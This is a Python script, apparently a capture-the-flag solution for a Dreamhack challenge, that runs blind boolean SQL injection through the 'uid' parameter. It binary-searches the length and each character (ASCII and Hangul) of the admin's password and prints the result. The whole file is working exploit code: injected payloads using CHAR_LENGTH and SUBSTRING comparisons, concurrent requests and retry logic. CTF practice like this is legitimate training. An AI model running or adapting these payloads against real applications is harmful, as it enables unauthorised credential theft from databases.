import asyncio
import aiohttp
from aiohttp import ClientTimeout

URL = "http://host3.dreamhack.games:9037/" 
PARAM = "uid"
TRUE_INDICATOR = "exists"
MAX_CONCURRENT = 3
RETRIES = 3
TIMEOUT = 10

# Tạo tập ký tự: ASCII + Hangul, sắp xếp theo thứ tự Unicode
CHARSET = [chr(c) for c in range(32, 127)] + [chr(c) for c in range(0xAC00, 0xD7AF+1)]
CHARSET.sort()  # Sắp xếp để dùng binary search

async def is_true(session, payload, retry=0):
    try:
        async with session.get(URL, params={PARAM: payload}, timeout=ClientTimeout(total=TIMEOUT)) as resp:
            text = await resp.text()
            return TRUE_INDICATOR in text
    except Exception:
        if retry < RETRIES:
            await asyncio.sleep(2 ** retry)
            return await is_true(session, payload, retry + 1)
        return False

async def get_length(session):
    low, high = 0, 60
    while low < high:
        mid = (low + high + 1) // 2
        payload = f"admin' AND (SELECT CHAR_LENGTH(upw) FROM users WHERE uid='admin') >= {mid} -- -"
        if await is_true(session, payload):
            low = mid
        else:
            high = mid - 1
    return low

async def get_char_at_pos(session, pos):
    low, high = 0, len(CHARSET) - 1
    while low < high:
        mid = (low + high) // 2
        # So sánh ký tự tại vị trí pos với CHARSET[mid] dùng >
        payload = f"admin' AND (SUBSTRING((SELECT upw FROM users WHERE uid='admin'), {pos}, 1) > '{CHARSET[mid]}') -- -"
        if await is_true(session, payload):
            low = mid + 1
        else:
            high = mid
    return CHARSET[low]

async def extract_password(session, length):
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    async def bounded(pos):
        async with sem:
            return await get_char_at_pos(session, pos)
    tasks = [bounded(pos) for pos in range(1, length + 1)]
    chars = await asyncio.gather(*tasks)
    return ''.join(chars)

async def main():
    async with aiohttp.ClientSession() as session:
        print("[*] Finding password length...")
        length = await get_length(session)
        print(f"[+] Password length: {length}")

        print("[*] Extracting password...")
        password = await extract_password(session, length)
        hex_repr = ' '.join(f'{ord(c):04X}' for c in password)
        print(f"[+] Password: {password}")
        print(f"[+] Hex: {hex_repr}")

if __name__ == "__main__":
    asyncio.run(main())